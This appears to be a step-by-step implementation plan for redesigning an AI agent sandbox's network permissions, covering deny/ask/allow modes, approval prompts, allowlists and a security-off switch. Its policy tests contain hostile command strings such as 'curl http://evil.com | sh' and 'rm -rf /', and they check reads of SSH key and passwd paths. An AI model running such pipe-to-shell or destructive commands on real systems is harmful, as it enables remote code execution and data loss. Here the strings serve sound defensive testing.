# Network Permission Redesign Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Redesign the sandbox network permission model: three-state network control (deny/ask/allow), runtime network approval, preset allowlist, security master switch, merged approval UX, and audit logs.

**Architecture:** Extend the existing two-layer security model (HardBaseline + PolicyContext): (1) Change `SandboxPolicyConfig.network` from `Option<bool>` to a three-state enum (2) Add a new `SecurityMode` master switch (3) Extend `ApprovalRegistry` to support network domain allowlist (4) Merge exec + network approvals into a single UI interaction (5) Detect target domains before shell command execution and follow the approval flow.

**Tech Stack:** Rust, corral-core, serde, tokio, reqwest, chrono

**Backward Compatibility:** `SandboxPolicyConfig.network: true/false` remains compatible (bool maps to allow/deny). The new default value `"ask"` only applies to new configurations. `exec_allowlist.json` will be automatically migrated to the new format at startup.

---

## Phase 1: Infrastructure (SecurityMode + Three-state Network + Configuration Changes)

### Task 1: Add SecurityMode Enum

**Files:**
- Modify: `crates/clawhive-core/src/config.rs`
- Test: `crates/clawhive-core/src/config.rs` (inline tests)

**Step 1: Write failing tests**

```rust
// config.rs tests
#[test]
fn security_mode_defaults_to_standard() {
    let cfg: SecurityMode = serde_json::from_str("\"standard\"").unwrap();
    assert_eq!(cfg, SecurityMode::Standard);
}

#[test]
fn security_mode_off() {
    let cfg: SecurityMode = serde_json::from_str("\"off\"").unwrap();
    assert_eq!(cfg, SecurityMode::Off);
}

#[test]
fn security_mode_default_is_standard() {
    assert_eq!(SecurityMode::default(), SecurityMode::Standard);
}
```

**Step 2: Run tests to confirm failure**

Run: `cargo test -p clawhive-core -- config::tests::security_mode -v`
Expected: FAIL — `SecurityMode` does not exist

**Step 3: Implement SecurityMode**

```rust
// config.rs — Add before ExecSecurityMode
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(rename_all = "lowercase")]
pub enum SecurityMode {
    /// All security checks enabled (default)
    #[default]
    Standard,
    /// All security checks disabled — HardBaseline, approval, sandbox restrictions all off
    Off,
}
```

Add field to `FullAgentConfig`:

```rust
pub struct FullAgentConfig {
    // ... existing fields ...
    #[serde(default)]
    pub security: SecurityMode,
}
```

**Step 4: Run tests to confirm success**

Run: `cargo test -p clawhive-core -- config::tests::security_mode -v`
Expected: PASS

**Step 5: Commit**

```bash
git add crates/clawhive-core/src/config.rs
git commit -m "feat: add SecurityMode enum (standard/off) to agent config"
```

---

### Task 2: Three-state SandboxPolicyConfig.network

**Files:**
- Modify: `crates/clawhive-core/src/config.rs`
- Modify: `crates/clawhive-core/src/shell_tool.rs`
- Test: `crates/clawhive-core/src/config.rs` (inline tests)

**Step 1: Write failing tests**

```rust
// config.rs tests
#[test]
fn sandbox_network_mode_from_string() {
    let ask: SandboxNetworkMode = serde_json::from_str("\"ask\"").unwrap();
    assert_eq!(ask, SandboxNetworkMode::Ask);

    let allow: SandboxNetworkMode = serde_json::from_str("\"allow\"").unwrap();
    assert_eq!(allow, SandboxNetworkMode::Allow);

    let deny: SandboxNetworkMode = serde_json::from_str("\"deny\"").unwrap();
    assert_eq!(deny, SandboxNetworkMode::Deny);
}

#[test]
fn sandbox_network_mode_from_bool_compat() {
    // Backward compatibility: true → Allow, false → Deny
    let allow: SandboxNetworkMode = serde_json::from_str("true").unwrap();
    assert_eq!(allow, SandboxNetworkMode::Allow);

    let deny: SandboxNetworkMode = serde_json::from_str("false").unwrap();
    assert_eq!(deny, SandboxNetworkMode::Deny);
}

#[test]
fn sandbox_network_mode_default_is_ask() {
    assert_eq!(SandboxNetworkMode::default(), SandboxNetworkMode::Ask);
}

#[test]
fn sandbox_policy_default_network_allow_not_empty() {
    let cfg = SandboxPolicyConfig::default();
    assert!(!cfg.network_allow.is_empty(), "default preset whitelist should not be empty");
    assert!(cfg.network_allow.iter().any(|h| h.contains("github.com")));
}
```

**Step 2: Run tests to confirm failure**

Run: `cargo test -p clawhive-core -- config::tests::sandbox_network -v`
Expected: FAIL

**Step 3: Implement three-state enum + preset allowlist**

```rust
// config.rs

/// Network access mode for sandbox
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Default)]
#[serde(rename_all = "lowercase")]
pub enum SandboxNetworkMode {
    /// Block all network access from sandbox
    Deny,
    /// Default: allow whitelisted, prompt for unknown domains
    #[default]
    Ask,
    /// Allow all network access
    Allow,
}

// Custom deserializer for backward compatibility (bool → enum)
impl<'de> Deserialize<'de> for SandboxNetworkMode {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        use serde::de;
        let value = serde_json::Value::deserialize(deserializer)?;
        match value {
            serde_json::Value::Bool(true) => Ok(SandboxNetworkMode::Allow),
            serde_json::Value::Bool(false) => Ok(SandboxNetworkMode::Deny),
            serde_json::Value::String(s) => match s.as_str() {
                "deny" => Ok(SandboxNetworkMode::Deny),
                "ask" => Ok(SandboxNetworkMode::Ask),
                "allow" => Ok(SandboxNetworkMode::Allow),
                _ => Err(de::Error::custom(format!("unknown network mode: {s}"))),
            },
            _ => Err(de::Error::custom("expected bool or string for network mode")),
        }
    }
}
```

Modify `SandboxPolicyConfig`:

```rust
pub struct SandboxPolicyConfig {
    /// Network access mode (default: "ask")
    #[serde(default)]
    pub network: SandboxNetworkMode,
    /// Preset network whitelist — domains allowed without approval in "ask" mode
    #[serde(default = "default_sandbox_network_allow")]
    pub network_allow: Vec<String>,
    /// Dangerous: allow specific private network addresses (bypass HardBaseline)
    #[serde(default)]
    pub dangerous_allow_private: Vec<String>,
    // ... existing fields (timeout_secs, max_memory_mb, env_inherit, exec_allow)
}

fn default_sandbox_network_allow() -> Vec<String> {
    vec![
        // Git hosting
        "github.com:443".into(),
        "*.github.com:443".into(),
        "gitlab.com:443".into(),
        "*.gitlab.com:443".into(),
        "bitbucket.org:443".into(),
        "*.bitbucket.org:443".into(),
        // Package registries
        "registry.npmjs.org:443".into(),
        "*.npmjs.org:443".into(),
        "pypi.org:443".into(),
        "*.pypi.org:443".into(),
        "crates.io:443".into(),
        "*.crates.io:443".into(),
        "registry.yarnpkg.com:443".into(),
        "rubygems.org:443".into(),
        "deb.debian.org:443".into(),
        "archive.ubuntu.com:80".into(),
        // CDN
        "cdn.jsdelivr.net:443".into(),
        "cdnjs.cloudflare.com:443".into(),
        "unpkg.com:443".into(),
        // Documentation
        "docs.rs:443".into(),
        "doc.rust-lang.org:443".into(),
        "developer.mozilla.org:443".into(),
        "stackoverflow.com:443".into(),
        // AI APIs
        "api.openai.com:443".into(),
        "api.anthropic.com:443".into(),
        "generativelanguage.googleapis.com:443".into(),
        "api.groq.com:443".into(),
        "api.deepseek.com:443".into(),
        // Search
        "api.search.brave.com:443".into(),
        "www.google.com:443".into(),
    ]
}
```

**Step 4: Update SandboxPolicyConfig::default() and old `network: Option<bool>` field**

Remove the old `pub network: Option<bool>` field and replace it with the new fields above. Update `Default` impl.

**Step 5: Update `make_sandbox` and `sandbox_with_broker` in shell_tool.rs**

Replace the old:
```rust
let network_allowed = sandbox_cfg.network.unwrap_or(cfg!(target_os = "macos"));
```
with:
```rust
let network_allowed = match sandbox_cfg.network {
    SandboxNetworkMode::Allow | SandboxNetworkMode::Ask => true,
    SandboxNetworkMode::Deny => false,
};
```

Note: `Ask` mode also grants network access at the sandbox layer (`*:*`), while approval is handled at the application layer. This is because corral's `--unshare-net` is a kernel-level block that cannot be dynamically enabled after the sandbox starts.

**Step 6: Run tests to confirm success**

Run: `cargo test -p clawhive-core -- config::tests::sandbox_network -v`
Run: `cargo test -p clawhive-core -- shell_tool -v`
Expected: PASS (may need to update assertions for `SandboxPolicyConfig::default()` in existing shell_tool tests)

**Step 7: Commit**

```bash
git add crates/clawhive-core/src/config.rs crates/clawhive-core/src/shell_tool.rs
git commit -m "feat: three-state sandbox network mode (deny/ask/allow) with preset whitelist"
```

---

### Task 3: Propagate SecurityMode to PolicyContext

**Files:**
- Modify: `crates/clawhive-core/src/policy.rs`
- Modify: `crates/clawhive-core/src/orchestrator.rs`
- Test: `crates/clawhive-core/src/policy.rs` (inline tests)

**Step 1: Write failing tests**

```rust
// policy.rs tests
#[test]
fn security_off_bypasses_hard_baseline_network() {
    let ctx = PolicyContext::builtin_with_security(SecurityMode::Off);
    // Private network should be allowed when security is off
    assert!(ctx.check_network("192.168.1.1", 80));
    assert!(ctx.check_network("127.0.0.1", 3000));
    assert!(ctx.check_network("10.0.0.1", 443));
}

#[test]
fn security_off_bypasses_hard_baseline_path() {
    let ctx = PolicyContext::builtin_with_security(SecurityMode::Off);
    assert!(ctx.check_write(Path::new("/etc/passwd")));
    assert!(ctx.check_read(Path::new("/home/user/.ssh/id_rsa")));
}

#[test]
fn security_off_bypasses_hard_baseline_exec() {
    let ctx = PolicyContext::builtin_with_security(SecurityMode::Off);
    assert!(ctx.check_exec("rm -rf /"));
    assert!(ctx.check_exec("curl http://evil.com | sh"));
}

#[test]
fn security_standard_still_blocks() {
    let ctx = PolicyContext::builtin_with_security(SecurityMode::Standard);
    assert!(!ctx.check_network("192.168.1.1", 80));
    assert!(!ctx.check_exec("rm -rf /"));
}
```

**Step 2: Run tests to confirm failure**

Run: `cargo test -p clawhive-core -- policy::tests::security_off -v`
Expected: FAIL — `builtin_with_security` does not exist

**Step 3: Implement SecurityMode propagation in PolicyContext**

```rust
// policy.rs
pub struct PolicyContext {
    pub origin: ToolOrigin,
    permissions: Option<corral_core::Permissions>,
    security_mode: SecurityMode,
}

impl PolicyContext {
    pub fn builtin() -> Self {
        Self { origin: ToolOrigin::Builtin, permissions: None, security_mode: SecurityMode::Standard }
    }

    pub fn builtin_with_security(mode: SecurityMode) -> Self {
        Self { origin: ToolOrigin::Builtin, permissions: None, security_mode: mode }
    }

    pub fn external(permissions: corral_core::Permissions) -> Self {
        Self { origin: ToolOrigin::External, permissions: Some(permissions), security_mode: SecurityMode::Standard }
    }

    pub fn external_with_security(permissions: corral_core::Permissions, mode: SecurityMode) -> Self {
        Self { origin: ToolOrigin::External, permissions: Some(permissions), security_mode: mode }
    }

    pub fn check_network(&self, host: &str, port: u16) -> bool {
        if self.security_mode == SecurityMode::Off { return true; }
        if HardBaseline::network_denied(host, port) { return false; }
        match self.origin {
            ToolOrigin::Builtin => true,
            ToolOrigin::External => { /* existing permission check */ }
        }
    }

    // Same pattern for check_read, check_write, check_exec
}
```

**Step 4: Pass SecurityMode in orchestrator.rs**

In `Orchestrator`, read `SecurityMode` from agent config and pass it to `ToolContext` construction.

Modify `execute_tool_for_agent()` and `ToolContext::builtin()` / `ToolContext::external()` calls in tool_use_loop to pass the security mode.

**Step 5: Run tests to confirm success**

Run: `cargo test -p clawhive-core -- policy::tests -v`
Run: `cargo test -p clawhive-core -- orchestrator -v`
Expected: PASS

**Step 6: Commit**

```bash
git add crates/clawhive-core/src/policy.rs crates/clawhive-core/src/orchestrator.rs crates/clawhive-core/src/tool.rs
git commit -m "feat: SecurityMode propagation — off mode bypasses all HardBaseline checks"
```

---

### Task 4: CLI --no-security / --security Overrides

**Files:**
- Modify: `crates/clawhive-cli/src/main.rs`
- Test: Manual testing (CLI parameters)

**Step 1: Add clap arguments**

In `start`, `chat`, and `code` subcommands, add:

```rust
/// Override security mode (overrides agent config)
#[arg(long, value_name = "MODE")]
security: Option<SecurityMode>,

/// Shorthand for --security off
#[arg(long)]
no_security: bool,
```

**Step 2: Argument parsing logic**

```rust
let security_override = if args.no_security {
    Some(SecurityMode::Off)
} else {
    args.security
};
```

Pass to `Orchestrator` construction. If an override exists, the Orchestrator uses it when building agent tools; otherwise, it uses the agent config.

**Step 3: Startup warning**

```rust
if security_override == Some(SecurityMode::Off) {
    tracing::warn!("⚠️  Security disabled via --no-security flag. All security checks are OFF.");
}
```

**Step 4: Commit**

```bash
git add crates/clawhive-cli/src/main.rs
git commit -m "feat: --no-security / --security CLI flags to override agent security mode"
```

---

## Phase 2: Network Approval Mechanism

### Task 5: Extend ApprovalRegistry to support network allowlist

**Files:**
- Modify: `crates/clawhive-core/src/approval.rs`
- Test: `crates/clawhive-core/tests/approval_registry.rs`

**Step 1: Write failing tests**

```rust
// approval_registry.rs
#[tokio::test]
async fn network_allowlist_persists() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("runtime_allowlist.json");

    let reg = ApprovalRegistry::with_persistence(path.clone());
    reg.add_network_allow_pattern("main", "custom-api.com:443".into()).await;
    assert!(reg.is_network_allowed("main", "custom-api.com", 443).await);
    assert!(!reg.is_network_allowed("main", "other.com", 443).await);

    // Reload from disk
    let reg2 = ApprovalRegistry::with_persistence(path);
    assert!(reg2.is_network_allowed("main", "custom-api.com", 443).await);
}

#[tokio::test]
async fn migrates_old_format() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("runtime_allowlist.json");

    // Write old format
    std::fs::write(&path, r#"{"agents":{"main":["git *","cargo *"]}}"#).unwrap();

    let reg = ApprovalRegistry::with_persistence(path);
    // Old exec patterns should be migrated
    assert!(reg.is_runtime_allowed("main", "git status").await);
    assert!(reg.is_runtime_allowed("main", "cargo build").await);
}
```

**Step 2: Run tests to confirm failure**

Run: `cargo test -p clawhive-core -- approval -v`
Expected: FAIL

**Step 3: Refactor PersistedAllowlist structure**

```rust
// approval.rs

/// New format: per-agent, per-category
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
struct PersistedAllowlist {
    agents: HashMap<String, AgentAllowlist>,
}

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
struct AgentAllowlist {
    #[serde(default)]
    exec: Vec<String>,
    #[serde(default)]
    network: Vec<String>,
}

/// Old format (for migration)
#[derive(Deserialize)]
struct LegacyAllowlist {
    agents: HashMap<String, Vec<String>>,
}
```

In `with_persistence`, add migration logic: try the new format first; if it fails, try the old format and convert.

Add `add_network_allow_pattern` and `is_network_allowed` methods (symmetrical to existing exec methods).

**Step 4: Update filename**

In `main.rs`, change `data/exec_allowlist.json` to `data/runtime_allowlist.json`.

Migration: If `runtime_allowlist.json` does not exist but `exec_allowlist.json` exists at startup, automatically rename it.

**Step 5: Run tests to confirm success**

Run: `cargo test -p clawhive-core -- approval -v`
Expected: PASS

**Step 6: Commit**

```bash
git add crates/clawhive-core/src/approval.rs crates/clawhive-core/tests/approval_registry.rs crates/clawhive-cli/src/main.rs
git commit -m "feat: unified runtime_allowlist.json with exec + network categories and migration"
```

---

### Task 6: Shell Command Network Approval Flow (ask mode)

**Files:**
- Modify: `crates/clawhive-core/src/shell_tool.rs`
- Test: `crates/clawhive-core/src/shell_tool.rs` (inline tests)

**Step 1: Write failing tests**

```rust
#[tokio::test]
async fn ask_mode_allows_whitelisted_domain() {
    // Setup: sandbox.network = "ask", network_allow includes "github.com:443"
    // Command: "git clone https://github.com/user/repo"
    // Expected: no approval prompt, command executes with network
}

#[tokio::test]
async fn ask_mode_prompts_for_unknown_domain() {
    // Setup: sandbox.network = "ask", network_allow does NOT include "custom.com:443"
    // Command: "curl https://custom.com/api"
    // Expected: NeedHumanApproval is published, command blocks until decision
}

#[tokio::test]
async fn ask_mode_package_manager_auto_allows() {
    // Setup: sandbox.network = "ask"
    // Command: "npm install express"
    // Expected: no approval prompt (npm auto-allows registry.npmjs.org)
}
```

**Step 2: Implement domain extraction**

Add helper functions in shell_tool.rs:

```rust
/// Extract target hosts from command arguments (best-effort)
fn extract_network_targets(command: &str) -> Vec<(String, u16)> {
    // Parse URLs from command args:
    // - git clone/pull/push/fetch <url>
    // - curl/wget <url>
    // - Generic https://... pattern
    let mut targets = Vec::new();
    for token in command.split_whitespace() {
        if let Ok(url) = reqwest::Url::parse(token) {
            if let Some(host) = url.host_str() {
                let port = url.port_or_known_default().unwrap_or(443);
                targets.push((host.to_string(), port));
            }
        }
    }
    targets
}

/// Known package manager commands and their registry domains
fn package_manager_domains(command: &str) -> Vec<String> {
    let first_token = command.split_whitespace().next().unwrap_or("");
    match first_token {
        "npm" | "npx" | "yarn" | "pnpm" => vec![
            "registry.npmjs.org:443".into(),
            "*.npmjs.org:443".into(),
            "registry.yarnpkg.com:443".into(),
        ],
        "pip" | "pip3" => vec![
            "pypi.org:443".into(),
            "*.pypi.org:443".into(),
        ],
        "cargo" => vec![
            "crates.io:443".into(),
            "*.crates.io:443".into(),
        ],
        "apt" | "apt-get" => vec![
            "*.debian.org:*".into(),
            "*.ubuntu.com:*".into(),
        ],
        "brew" => vec![
            "*.githubusercontent.com:443".into(),
        ],
        _ => vec![],
    }
}
```

**Step 3: Integrate network approval in execute()**

In `shell_tool.rs::execute()`, after exec security checks pass and before sandbox creation:

```rust
// After exec security checks pass, before sandbox creation:
if self.sandbox_config.network == SandboxNetworkMode::Ask {
    let targets = extract_network_targets(command);
    let pkg_domains = package_manager_domains(command);

    for (host, port) in &targets {
        let target = format!("{host}:{port}");
        let is_whitelisted = self.sandbox_config.network_allow.iter()
            .any(|pattern| glob_match(pattern, &target));
        let is_pkg_manager = pkg_domains.iter()
            .any(|pattern| glob_match(pattern, &target));
        let is_runtime_allowed = match self.approval_registry.as_ref() {
            Some(reg) => reg.is_network_allowed(&self.agent_id, host, *port).await,
            None => false,
        };

        if !is_whitelisted && !is_pkg_manager && !is_runtime_allowed {
            // Trigger combined approval (exec + network)
            if let Some(reason) = self.wait_for_network_approval(
                command, host, *port, source_info
            ).await? {
                return Ok(ToolOutput { content: reason, is_error: true });
            }
        }
    }
}
```

**Step 4: Implement wait_for_network_approval**

Reuse the existing `wait_for_approval` pattern, but with BusMessage carrying network target information (see Task 7).

If `AlwaysAllow`, call `registry.add_network_allow_pattern(agent_id, target)` for persistence.

**Step 5: Run tests to confirm success**

Run: `cargo test -p clawhive-core -- shell_tool -v`
Expected: PASS

**Step 6: Commit**

```bash
git add crates/clawhive-core/src/shell_tool.rs
git commit -m "feat: network approval flow in ask mode with domain extraction and package manager auto-allow"
```

---

### Task 7: BusMessage Extension + Merged Approval UI

**Files:**
- Modify: `crates/clawhive-schema/src/lib.rs`
- Modify: `crates/clawhive-channels/src/discord.rs`
- Modify: `crates/clawhive-channels/src/telegram.rs`
- Modify: `crates/clawhive-tui/src/lib.rs`
- Modify: `crates/clawhive-gateway/src/lib.rs`

**Step 1: Extend BusMessage**

Add an optional network field to `NeedHumanApproval`:

```rust
NeedHumanApproval {
    trace_id: Uuid,
    reason: String,
    agent_id: String,
    command: String,
    /// Network target requiring approval (None = exec-only approval)
    network_target: Option<String>,
    source_channel_type: Option<String>,
    source_connector_id: Option<String>,
    source_conversation_scope: Option<String>,
},
```

**Step 2: Update Discord approval message**

```rust
// discord.rs — spawn_approval_listener
let text = if let Some(ref target) = network_target {
    format!(
        "⚠️ **Approval Required**\nAgent: `{agent_id}`\nCommand: `{command}`\nNetwork: `{target}`"
    )
} else {
    format!(
        "⚠️ **Command Approval Required**\nAgent: `{agent_id}`\nCommand: `{command}`"
    )
};
```

Apply symmetrical changes to Telegram and TUI.

**Step 3: Run tests**

Run: `cargo test --workspace`
Expected: PASS (compilation succeeds + existing tests continue to pass)

**Step 4: Commit**

```bash
git add crates/clawhive-schema/src/lib.rs crates/clawhive-channels/src/discord.rs crates/clawhive-channels/src/telegram.rs crates/clawhive-tui/src/lib.rs crates/clawhive-gateway/src/lib.rs
git commit -m "feat: merged exec + network approval UI with network_target in BusMessage"
```

---

## Phase 3: GAP Fixes + dangerous_allow_private

### Task 8: Fix GAP #1 — Compute merged_permissions for normal conversation mode

**Files:**
- Modify: `crates/clawhive-core/src/orchestrator.rs`
- Test: `crates/clawhive-core/tests/sandbox_integration.rs`

**Step 1: Modify orchestrator.rs handle_inbound()**

Current code (approx. lines 531-569):

```rust
let merged_permissions = if let Some(ref forced_names) = forced_skills {
    // ... only computes permissions for /skill mode
    Self::merge_permissions(selected_perms)
} else {
    None  // ← BUG: normal conversation always gets None
};
```

Modify to:

```rust
let merged_permissions = if let Some(ref forced_names) = forced_skills {
    // Forced skill mode: use only selected skill permissions
    let selected_perms = forced_names.iter().filter_map(/* ... existing logic ... */).collect();
    Self::merge_permissions(selected_perms)
} else {
    // Normal mode: merge permissions from all active skills that declare permissions
    active_skills.merged_permissions()
};
```

**Step 2: Verification**

Write an integration test to verify: When a skill declares `permissions.network.allow: ["api.foo.com:443"]`, `web_fetch` allows `api.foo.com:443` and denies `other.com:443` in a normal conversation.

**Step 3: Commit**

```bash
git add crates/clawhive-core/src/orchestrator.rs crates/clawhive-core/tests/sandbox_integration.rs
git commit -m "fix: apply skill network permissions in normal conversation mode (not just /skill)"
```

---

### Task 9: dangerous_allow_private Configuration

**Files:**
- Modify: `crates/clawhive-core/src/config.rs` (Field already added in Task 2)
- Modify: `crates/clawhive-core/src/policy.rs`
- Test: `crates/clawhive-core/src/policy.rs` (inline tests)

**Step 1: Write failing tests**

```rust
#[test]
fn dangerous_allow_private_bypasses_hard_baseline() {
    let ctx = PolicyContext::builtin_with_private_overrides(
        SecurityMode::Standard,
        vec!["127.0.0.1:11434".into(), "192.168.1.50:5432".into()],
    );
    // These specific addresses should be allowed
    assert!(ctx.check_network("127.0.0.1", 11434));
    assert!(ctx.check_network("192.168.1.50", 5432));
    // Other private addresses still blocked
    assert!(!ctx.check_network("127.0.0.1", 3000));
    assert!(!ctx.check_network("192.168.1.1", 80));
}

#[test]
fn cloud_metadata_never_overridable() {
    let ctx = PolicyContext::builtin_with_private_overrides(
        SecurityMode::Standard,
        vec!["169.254.169.254:80".into()],
    );
    // Cloud metadata is NEVER allowed, even with dangerous_allow_private
    assert!(!ctx.check_network("169.254.169.254", 80));
    assert!(!ctx.check_network("metadata.google.internal", 80));
}
```

**Step 2: Implementation**

Add `private_overrides: Vec<String>` field to `PolicyContext`.

In `check_network`, check `private_overrides` after HardBaseline rejection:

```rust
pub fn check_network(&self, host: &str, port: u16) -> bool {
    if self.security_mode == SecurityMode::Off { return true; }

    if HardBaseline::network_denied(host, port) {
        // Check dangerous_allow_private override
        // BUT never allow cloud metadata endpoints
        if HardBaseline::is_cloud_metadata(host, port) {
            return false; // absolute never-allow
        }
        let target = format!("{host}:{port}");
        if self.private_overrides.iter().any(|p| p == &target) {
            tracing::warn!(host, port, "private network access allowed via dangerous_allow_private");
            return true;
        }
        return false;
    }
    // ... existing origin-based check
}
```

Extract `is_cloud_metadata` as a standalone method:

```rust
impl HardBaseline {
    /// Cloud metadata endpoints — NEVER overridable, even with dangerous_allow_private
    pub fn is_cloud_metadata(host: &str, _port: u16) -> bool {
        let h = host.to_lowercase();
        h == "169.254.169.254"
            || h == "metadata.google.internal"
            || h == "metadata.goog"
    }
}
```

**Step 3: Pass dangerous_allow_private in orchestrator.rs**

Read from `SandboxPolicyConfig` and pass it to `PolicyContext` construction.

**Step 4: Run tests to confirm success**

Run: `cargo test -p clawhive-core -- policy::tests -v`
Expected: PASS

**Step 5: Commit**

```bash
git add crates/clawhive-core/src/policy.rs crates/clawhive-core/src/config.rs crates/clawhive-core/src/orchestrator.rs
git commit -m "feat: dangerous_allow_private for specific private network addresses (cloud metadata always blocked)"
```

---

## Phase 4: Audit Logs + CLI Management

### Task 10: Network Access Audit Logs

**Files:**
- Modify: `crates/clawhive-core/src/shell_tool.rs`
- Modify: `crates/clawhive-core/src/web_fetch_tool.rs`
- Modify: `crates/clawhive-core/src/audit.rs` (If it exists, or create new)

**Step 1: Add audit logs to successful network access paths in shell_tool and web_fetch_tool**

```rust
tracing::info!(
    target: "clawhive::audit::network",
    agent_id,
    tool = "execute_command",
    host,
    port,
    command,
    "network access"
);
```

Use tracing target prefix `clawhive::audit::network` to allow separate extraction via log filters.

**Step 2: Commit**

```bash
git add crates/clawhive-core/src/shell_tool.rs crates/clawhive-core/src/web_fetch_tool.rs
git commit -m "feat: audit logging for network access (tracing target clawhive::audit::network)"
```

---

### Task 11: CLI Management of allowlist

**Files:**
- Modify: `crates/clawhive-cli/src/main.rs`

**Step 1: Add subcommands**

```
clawhive allowlist list [--agent <id>]
clawhive allowlist remove <pattern> [--agent <id>] [--type exec|network]
clawhive allowlist clear [--agent <id>]
```

**Step 2: Implementation**

Read `~/.clawhive/data/runtime_allowlist.json`, then display/modify/clear.

```
$ clawhive allowlist list
Agent: clawhive-main
  exec:
    - git *
    - cargo *
  network:
    - custom-api.com:443

Agent: agent-dev
  exec:
    - python *
```

**Step 3: Commit**

```bash
git add crates/clawhive-cli/src/main.rs
git commit -m "feat: clawhive allowlist list/remove/clear CLI commands"
```

---

## Phase 5: Verification

### Task 12: End-to-end Integration Tests

**Files:**
- Modify: `crates/clawhive-core/tests/sandbox_integration.rs`

**Step 1: Test Matrix**

| Scenario | security | network | command | Expected Result |
|----------|----------|---------|---------|-----------------|
| Default config + allowlist hit | standard | ask | `git clone https://github.com/...` | Direct execution, no approval |
| Default config + unknown domain | standard | ask | `curl https://unknown.com` | Trigger approval |
| Default config + package manager | standard | ask | `npm install express` | Direct execution (auto-allow) |
| security off | off | (ignored) | `curl http://192.168.1.1` | Direct execution, no interception |
| network deny | standard | deny | `git clone https://github.com/...` | Sandbox blocks network |
| network allow | standard | allow | `curl https://anything.com` | Direct execution |
| dangerous_allow_private | standard | ask | `curl http://127.0.0.1:11434` | Allowed (declared in config) |
| cloud metadata never allowed | standard | ask | `curl http://169.254.169.254` | HardBaseline rejection |

**Step 2: Write tests and verify**

**Step 3: Commit**

```bash
git add crates/clawhive-core/tests/sandbox_integration.rs
git commit -m "test: end-to-end integration tests for network permission redesign"
```

---

### Task 13: Full verification via cargo check + clippy + test

**Step 1: Full check**

```bash
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings
cargo test --workspace
```

**Step 2: Fix any warnings or failures**

**Step 3: Final commit**

```bash
git commit -m "chore: fix clippy warnings and test adjustments for network permission redesign"
```

---

## Changed Files Overview

| File | Change Type |
|------|-------------|
| `crates/clawhive-core/src/config.rs` | SecurityMode enum, SandboxNetworkMode three-state, network_allow allowlist, dangerous_allow_private |
| `crates/clawhive-core/src/policy.rs` | PolicyContext accepts SecurityMode and private_overrides, is_cloud_metadata extraction |
| `crates/clawhive-core/src/shell_tool.rs` | Network approval flow, domain extraction, package manager detection, three-state mode support |
| `crates/clawhive-core/src/approval.rs` | PersistedAllowlist refactor (exec + network), migration logic, network allow methods |
| `crates/clawhive-core/src/web_fetch_tool.rs` | SecurityMode support, audit logs |
| `crates/clawhive-core/src/orchestrator.rs` | SecurityMode propagation, GAP #1 fix (merged_permissions), private_overrides passing |
| `crates/clawhive-core/src/tool.rs` | ToolContext passes SecurityMode |
| `crates/clawhive-schema/src/lib.rs` | Add network_target field to NeedHumanApproval |
| `crates/clawhive-channels/src/discord.rs` | Merged approval message format |
| `crates/clawhive-channels/src/telegram.rs` | Merged approval message format |
| `crates/clawhive-tui/src/lib.rs` | Merged approval overlay |
| `crates/clawhive-gateway/src/lib.rs` | Approval delivery support for network_target |
| `crates/clawhive-cli/src/main.rs` | --no-security flag, runtime_allowlist.json path, allowlist subcommands |
| `crates/clawhive-core/tests/sandbox_integration.rs` | End-to-end tests |
| `crates/clawhive-core/tests/approval_registry.rs` | New format + migration tests |
